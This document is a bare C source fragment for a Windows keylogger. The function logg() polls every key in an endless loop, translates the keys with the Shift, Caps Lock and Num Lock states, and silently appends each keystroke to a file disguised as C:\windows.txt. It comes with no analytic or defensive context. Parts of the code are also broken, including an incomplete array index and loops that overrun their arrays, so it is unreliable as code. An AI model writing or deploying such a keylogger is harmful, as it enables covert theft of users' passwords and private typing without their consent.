DWORD WINAPI logg() 
{
	int vkey,last_key_state[0xFF];
	int isCAPSLOCK,isNUMLOCK;
	int isL_SHIFT,isR_SHIFT;
	int isPressed;
	char showKey;
	char NUMCHAR[]=")!@#$%^&*(";
	char chars_vn[]=";=,-./`";
	char chars_vs[]=":+<_>?~";
	char chars_va[]="[\\]\';";
	char chars_vb[]="{|}\"";
	FILE *kh;
	char KEY_LOG_FILE[]="C:\\windows.txt";

	for (vkey = 0x01; vkey < 0xFF; vkey++)
	{
		last_key_state[vkey]=0;
	}

	while (1)
	{
		Sleep(10);
		isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
		isNUMLOCK=(GetKeyState(0x90)&0xFF)>0?1:0;
		isL_SHIFT=(GetKeyState(0xA0)&0xFF00)>0?1:0;
		isR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;
		
		for (vkey = 0x01; vkey < 0xFF; vkey++)
		{
			isPressed=(GetKeyState(vkey)&0xFF00)>0?1:0;
			showKey=(char)vkey;
			if (isPressed == 1 && last_key_state[vkey] == 0)
			{
				if (vkey >= 0x41 && vkey <= 0x5A)
				{
					if (isCAPSLOCK == 0)
					{
						if(isL_SHIFT==0 && isR_SHIFT==0)
							showKey=(char)(vkey+0x20);
					}
					else if(isL_SHIFT==1 || isR_SHIFT==1)
						showKey=(char)(vkey+0x20);
				}
				else if (vkey >= 0x30 && vkey <= 0x39)
				{
					if(isL_SHIFT==1 || isR_SHIFT==1)
						showKey=NUMCHAR[vkey-0x30];
				}
				else
				{
					if (isL_SHIFT == 1 || isR_SHIFT == 1)
					{
						for (int i = 0; i < 14; i++)
						{
							if (vkey == chars_vn[i])
							{
								showKey=chars_vs[i];
								break;
							}
						}
					}
					else
					{
						for (int i = 0; i < 14; i++)
						{
							if (vkey == chars_vs[i])
							{
								showKey=chars_vn[i];
								break;
							}
						}
					}
				}
				if (isNUMLOCK == 0)
				{
					if(vkey>=0x60 && vkey<=0x69)
						showKey=(char)(vkey-0x30);
				}
				else
				{
					if(vkey>=0x60 && vkey<=0x69)
						showKey=NUMCHAR[vkey-0x60];
				}
				if (isL_SHIFT == 1 || isR_SHIFT == 1)
				{
					if(vkey>=0xBA && vkey<=0xC0)
						showKey=chars_va[vkey-0xBA];
					else if(vkey>=0xDB && vkey<=0xDF)
						showKey=chars_vb[vkey-0xDB];
					else if(vkey==0xDC)
						showKey=chars_va[]
				}
				if (showKey != (char)0x00)
				{
					kh=fopen(KEY_LOG_FILE,"a");
					putc(showKey,kh);
					fclose(kh);
				}
			}
			last_key_state[vkey]=isPressed;
		}
			
		
	}
}
